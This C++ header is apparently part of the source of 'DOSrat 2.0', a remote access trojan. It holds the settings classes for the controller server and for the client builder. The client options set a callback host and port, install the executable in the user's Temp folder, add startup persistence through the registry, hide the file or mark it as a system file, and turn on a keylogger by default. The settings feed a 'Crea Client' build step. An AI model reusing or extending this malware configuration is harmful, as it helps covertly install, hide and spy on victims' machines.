#pragma once

// Classe per la gestione dei settaggi del Server
class SettaggiServer
{
	private:
		DirUtils du;
		SettingsFile sf;

		// Struttura contenente i colori della console
		struct COLORI
		{
			short Conferma = 10;
			short Negativo = 12;
			short Avviso = 14;
		};

		void InitSettings()
		{
			if (!sf.CheckSetting("Port"))
				sf.SetSetting("Port", to_string(Porta));

			if (!sf.CheckSetting("CheckUpdate"))
				sf.SetSetting("CheckUpdate", (VerificaAggiornamenti) ? "true" : "false");

			if (!sf.CheckSetting("AutoUpdate"))
				sf.SetSetting("AutoUpdate", (AutoAggiornamento) ? "true" : "false");

			if (!sf.CheckSetting("ColorOk"))
				sf.SetSetting("ColorOk", to_string(Colori.Conferma));

			if (!sf.CheckSetting("ColorError"))
				sf.SetSetting("ColorError", to_string(Colori.Negativo));

			if (!sf.CheckSetting("ColorWarning"))
				sf.SetSetting("ColorWarning", to_string(Colori.Avviso));

			if (!sf.CheckSetting("WindowSizeX"))
				sf.SetSetting("WindowSizeX", to_string(DimensioniFinestra.X));

			if (!sf.CheckSetting("WindowSizeY"))
				sf.SetSetting("WindowSizeY", to_string(DimensioniFinestra.Y));
		}

	public:
		int Porta = 5555;
		bool VerificaAggiornamenti = true;
		bool AutoAggiornamento = true;
		COLORI Colori;
		COORD DimensioniFinestra{800, 600};
		
		// Costruttore
		SettaggiServer()
		{
			sf.SetFileName(du.GetModuleFilePath() + "settings.ini");
			InitSettings();
		}

		// Popola i settaggi ottenendoli dal relativo file
		bool GetSettings()
		{
			if (!sf.CheckFile())
				return false;

			Porta = stoi(sf.GetSetting("Port"));
			VerificaAggiornamenti = (sf.GetSetting("CheckUpdate") == "true");
			AutoAggiornamento = (sf.GetSetting("AutoUpdate") == "true");
			Colori.Conferma = (short)stoi(sf.GetSetting("ColorOk"));
			Colori.Negativo = (short)stoi(sf.GetSetting("ColorError"));
			Colori.Avviso = (short)stoi(sf.GetSetting("ColorWarning"));
			DimensioniFinestra.X = (short)stoi(sf.GetSetting("WindowSizeX"));
			DimensioniFinestra.Y = (short)stoi(sf.GetSetting("WindowSizeY"));

			return true;
		}

		// Scrive i settaggi su file
		bool SetSettings()
		{
			if (!sf.CheckFile())
				return false;

			sf.SetSetting("Port", to_string(Porta));
			sf.SetSetting("CheckUpdate", (VerificaAggiornamenti) ? "true" : "false");
			sf.SetSetting("AutoUpdate", (AutoAggiornamento) ? "true" : "false");
			sf.SetSetting("ColorOk", to_string(Colori.Conferma));
			sf.SetSetting("ColorError", to_string(Colori.Negativo));
			sf.SetSetting("ColorWarning", to_string(Colori.Avviso));
			sf.SetSetting("WindowSizeX", to_string(DimensioniFinestra.X));
			sf.SetSetting("WindowSizeY", to_string(DimensioniFinestra.Y));

			return true;
		}

		// Mostra in CLI i settaggi
		int ShowSettings()
		{
			CLInterface cli;
			VectSettings MenuImpostazioni;

			MenuImpostazioni.push_back(SettingsMenu());
			MenuImpostazioni[0].Escape = true;
			MenuImpostazioni[0].Name = "Salva ed Esci";

			MenuImpostazioni.push_back(SettingsMenu());
			MenuImpostazioni[1].Name = "Porta";
			MenuImpostazioni[1].Value = to_string(Porta);
			MenuImpostazioni[1].Escape = true;

			MenuImpostazioni.push_back(SettingsMenu());
			MenuImpostazioni[2].Name = "Verifica Aggiornamenti";
			MenuImpostazioni[2].CheckValue = "true";
			MenuImpostazioni[2].Value = (VerificaAggiornamenti) ? "true" : "false";

			MenuImpostazioni.push_back(SettingsMenu());
			MenuImpostazioni[3].Name = "Aggiornamenti Automatici";
			MenuImpostazioni[3].CheckValue = "true";
			MenuImpostazioni[3].Value = (AutoAggiornamento) ? "true" : "false";

			MenuImpostazioni.push_back(SettingsMenu());
			MenuImpostazioni[4].Name = "Imposta Colori";
			MenuImpostazioni[4].Escape = true;

			MenuImpostazioni.push_back(SettingsMenu());
			MenuImpostazioni[5].Name = "Dimensioni Finestra";
			MenuImpostazioni[5].Value = to_string(DimensioniFinestra.X);
			MenuImpostazioni[5].SecValue = to_string(DimensioniFinestra.Y);
			MenuImpostazioni[5].Escape = true;

			return cli.MenuSettings(MenuImpostazioni);
		}
};

// Classe per la gestione dei settaggi del Client
class SettaggiClient
{
private:
	DirUtils du;
	SettingsFile sf;

	void InitSettings()
	{
		if (!sf.CheckSetting("Host"))
			sf.SetSetting("Host", Host);

		if (!sf.CheckSetting("Port"))
			sf.SetSetting("Port", to_string(Porta));

		if (!sf.CheckSetting("InstallPath"))
			sf.SetSetting("InstallPath", InstallPath);

		if (!sf.CheckSetting("ExeName"))
			sf.SetSetting("ExeName", ExeName);

		if (!sf.CheckSetting("RegStartup"))
			sf.SetSetting("RegStartup", (RegStartup) ? "true" : "false");

		if (!sf.CheckSetting("HideExe"))
			sf.SetSetting("HideExe", (HideExe) ? "true" : "false");

		if (!sf.CheckSetting("SystemFile"))
			sf.SetSetting("SystemFile", (SystemFile) ? "true" : "false");

		if (!sf.CheckSetting("KeyLogger"))
			sf.SetSetting("KeyLogger", (KeyLogger) ? "true" : "false");
	}

public:
	string Host = "127.0.0.1";
	int Porta = 5555;
	string InstallPath = "C:\\Users\\<User>\\AppData\\Local\\Temp";
	string ExeName = "Client.exe";
	bool RegStartup = true;
	bool HideExe = true;
	bool SystemFile = false;
	bool KeyLogger = true;

	// Costruttore
	SettaggiClient()
	{
		sf.SetFileName(du.GetModuleFilePath() + "c-settings.ini");
		InitSettings();
	}

	// Popola i settaggi ottenendoli dal relativo file
	bool GetSettings()
	{
		if (!sf.CheckFile())
			return false;

		Host = sf.GetSetting("Host");
		Porta = stoi(sf.GetSetting("Port"));
		InstallPath = sf.GetSetting("InstallPath");
		ExeName = sf.GetSetting("ExeName");
		RegStartup = (sf.GetSetting("RegStartup") == "true");
		HideExe = (sf.GetSetting("HideExe") == "true");
		SystemFile = (sf.GetSetting("SystemFile") == "true");
		KeyLogger = (sf.GetSetting("KeyLogger") == "true");

		return true;
	}

	// Restituisce i settaggi per il client in stringa
	string DumpSettingsForBuild()
	{
		string Dump = sf.Buff;

		Dump.erase(Dump.find("[HideExe]"), Dump.find("\\;", Dump.find("[HideExe]")) + 2 - Dump.find("[HideExe]"));
		Dump.erase(Dump.find("[SystemFile]"), Dump.find("\\;", Dump.find("[SystemFile]")) + 2 - Dump.find("[SystemFile]"));

		return Dump;
	}

	// Scrive i settaggi su file
	bool SetSettings()
	{
		if (!sf.CheckFile())
			return false;

		sf.SetSetting("Host", Host);
		sf.SetSetting("Port", to_string(Porta));
		sf.SetSetting("InstallPath", InstallPath);
		sf.SetSetting("ExeName", ExeName);
		sf.SetSetting("RegStartup", (RegStartup) ? "true" : "false");
		sf.SetSetting("HideExe", (HideExe) ? "true" : "false");
		sf.SetSetting("SystemFile", (SystemFile) ? "true" : "false");
		sf.SetSetting("KeyLogger", (KeyLogger) ? "true" : "false");

		return true;
	}

	// Mostra in CLI i settaggi
	int ShowSettings()
	{
		CLInterface cli;
		VectSettings MenuImpostazioni;

		MenuImpostazioni.push_back(SettingsMenu());
		MenuImpostazioni[0].Name = "Esci";
		MenuImpostazioni[0].Escape = true;

		MenuImpostazioni.push_back(SettingsMenu());
		MenuImpostazioni[1].Name = "Host";
		MenuImpostazioni[1].Value = Host;
		MenuImpostazioni[1].Escape = true;

		MenuImpostazioni.push_back(SettingsMenu());
		MenuImpostazioni[2].Name = "Porta";
		MenuImpostazioni[2].Value = to_string(Porta);
		MenuImpostazioni[2].Escape = true;

		MenuImpostazioni.push_back(SettingsMenu());
		MenuImpostazioni[3].Name = "Percorso";
		MenuImpostazioni[3].Value = InstallPath;
		MenuImpostazioni[3].Escape = true;

		MenuImpostazioni.push_back(SettingsMenu());
		MenuImpostazioni[4].Name = "Nome File";
		MenuImpostazioni[4].Value = ExeName;
		MenuImpostazioni[4].Escape = true;

		MenuImpostazioni.push_back(SettingsMenu());
		MenuImpostazioni[5].Name = "Avvia con Windows";
		MenuImpostazioni[5].Value = (RegStartup) ? "true" : "false";
		MenuImpostazioni[5].CheckValue = "true";

		MenuImpostazioni.push_back(SettingsMenu());
		MenuImpostazioni[6].Name = "File Nascosto";
		MenuImpostazioni[6].Value = (HideExe) ? "true" : "false";
		MenuImpostazioni[6].CheckValue = "true";

		MenuImpostazioni.push_back(SettingsMenu());
		MenuImpostazioni[7].Name = "File di Sistema";
		MenuImpostazioni[7].Value = (SystemFile) ? "true" : "false";
		MenuImpostazioni[7].CheckValue = "true";

		MenuImpostazioni.push_back(SettingsMenu());
		MenuImpostazioni[8].Name = "Crea Client";
		MenuImpostazioni[8].Escape = true;

		return cli.MenuSettings(MenuImpostazioni);
	}
};

// Utility per i Clients, principalmente per aggiornare il titolo
class ClientUtils
{
public:
	int ClientCount = 0;
	enum TitleType { Menu };

private:
	SettaggiServer* settings;
	TitleType CurrentTitleType = Menu;

	void AggiornaCount()
	{
		ClientCount = 0;

		for (int i = 0; i < MAX_CLIENTS; i++)
			if (Clients[i].IsConnected)
				ClientCount++;
	}

public:

	ClientUtils(SettaggiServer& settaggi)
	{
		settings = &settaggi;
	}

	void AggiornaTitolo(TitleType tipo)
	{
		AggiornaCount();

		ConsoleUtils cu;
		string Sep = " - ";
		string Start = "DOSrat 2.0 By Criper98";
		string Clients = "Clients[" + to_string(ClientCount) + "/" + to_string(MAX_CLIENTS) + "]";
		string StatusAscolto = "In Ascolto...";
		string Porta = "Port[" + to_string(settings->Porta) + "]";

		switch (tipo)
		{
			case Menu:
				cu.ConsoleTitle(Start + Sep + Porta + " " + Clients + Sep + StatusAscolto);
				break;

			default:
				cu.ConsoleTitle(Start + Sep + Clients);
				break;
		}

		CurrentTitleType = tipo;
	}

	void AggiornaTitolo()
	{
		AggiornaTitolo(CurrentTitleType);
	}
};